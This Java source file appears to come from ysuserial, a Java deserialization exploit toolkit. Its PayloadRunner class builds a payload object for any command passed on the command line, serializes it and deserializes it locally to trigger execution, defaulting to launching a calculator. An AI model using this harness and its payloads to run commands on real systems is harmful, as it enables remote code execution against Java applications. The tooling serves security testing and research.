package org.su18.ysuserial.payloads.util;

import java.io.File;
import java.util.concurrent.Callable;

import org.su18.ysuserial.Deserializer;
import org.su18.ysuserial.Serializer;
import static org.su18.ysuserial.Deserializer.deserialize;
import static org.su18.ysuserial.Serializer.serialize;
import org.su18.ysuserial.payloads.ObjectPayload;
import org.su18.ysuserial.payloads.ObjectPayload.Utils;
import org.su18.ysuserial.secmgr.ExecCheckingSecurityManager;

/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {

    public static void run(final Class<? extends ObjectPayload<?>> clazz, final String[] args) throws Exception {
		// ensure payload generation doesn't throw an exception
		byte[] serialized = new ExecCheckingSecurityManager().callWrapped(new Callable<byte[]>(){
			public byte[] call() throws Exception {
				final String command = args.length > 0 && args[0] != null ? args[0] : getDefaultTestCmd();

				System.out.println("generating payload object(s) for command: '" + command + "'");

				ObjectPayload<?> payload = clazz.newInstance();
                final Object objBefore = payload.getObject(command);

				System.out.println("serializing payload");
				byte[] ser = Serializer.serialize(objBefore);
				Utils.releasePayload(payload, objBefore);
                return ser;
		}});

		try {
			System.out.println("deserializing payload");
			final Object objAfter = Deserializer.deserialize(serialized);
		} catch (Exception e) {
			e.printStackTrace();
		}

	}

    private static String getDefaultTestCmd() {
	    return getFirstExistingFile(
	        "C:\\Windows\\System32\\calc.exe",
            "/Applications/Calculator.app/Contents/MacOS/Calculator",
            "/usr/bin/gnome-calculator",
            "/usr/bin/kcalc"
        );
    }

    private static String getFirstExistingFile(String ... files) {
        for (String path : files) {
            if (new File(path).exists()) {
                return path;
            }
        }
        throw new UnsupportedOperationException("no known test executable");
    }
}
